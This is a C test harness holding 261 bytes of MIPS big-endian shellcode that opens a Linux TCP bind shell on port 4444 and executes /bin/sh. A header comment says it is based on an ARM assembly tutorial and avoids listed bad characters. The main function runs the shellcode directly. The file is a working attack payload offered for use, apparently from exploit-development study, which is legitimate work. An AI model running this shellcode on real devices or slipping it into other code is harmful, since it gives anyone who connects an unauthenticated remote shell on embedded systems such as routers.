/*    - MIPS big-endian
 *    - 261 bytes 
 *    - linux bind shell on port 4444
 *    - based on azeria's guide for ARM https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/
 *    - Avoids use of bad char's [ "\x00", "\x0a", "\x0d", "\x20", "\x25", "\x3d" ]
 *    - ASM can be found in file 'mipsbe_bindshell01.asm'
 */

#include <stdio.h>

char shellcode[] = {
    "\x24\x0e\xff\xfd\x01\xc0\x28\x27\x30\xa4\xff\xff\x28\x06\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\x24\x0f\x73\x50\x30\x51\xff\xff\x32\x24\xff\xff\x24\x0e\x8c\xb0\x05\xd0\xff\xff\x28\x0e\xff\xff\x24\x0e\xff\x3b\x01\xc0\x70\x27\x03\xee\x28\x21\x23\xf3\x01\x01\xa2\x66\xff\xd2\xa2\x66\xff\xc3\xae\x66\xff\xc7\x24\x0e\xff\xef\x01\xc0\x30\x27\x24\x02\x10\x49\x01\x01\x01\x0c\x24\x0f\x73\x50\x32\x24\xff\xff\x24\x0e\xff\xfd\x01\xc0\x28\x27\x24\x02\x10\x4e\x01\x01\x01\x0c\x24\x0f\x73\x50\x32\x24\xff\xff\x28\x05\xff\xff\x28\x06\xff\xff\x24\x02\x10\x48\x01\x01\x01\x0c\x24\x0f\x73\x50\x30\x51\xff\xff\x32\x24\xff\xff\x28\x05\xff\xff\x24\x03\x0f\xdf\x30\x62\xff\xff\x01\x01\x01\x0c\x24\x0f\x73\x50\x32\x24\xff\xff\x28\x05\x01\x01\x30\x62\xff\xff\x01\x01\x01\x0c\x24\x0f\x73\x50\x32\x24\xff\xff\x24\x0e\xff\xfd\x01\xc0\x28\x27\x30\x62\xff\xff\x01\x01\x01\x0c\x24\x0f\x73\x50\x22\x64\xff\xcb\x28\x05\xff\xff\x28\x06\xff\xff\x24\x03\x0f\xab\x30\x62\xff\xff\x01\x01\x01\x0c\x24\x0f\x73\x50\xff\x02\x11\x5c\x01\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58"
    };

void main(void) {
    void (*s)(void);
    printf("Size of sc: %d\n", sizeof(shellcode));
    s = shellcode;
    s();
}
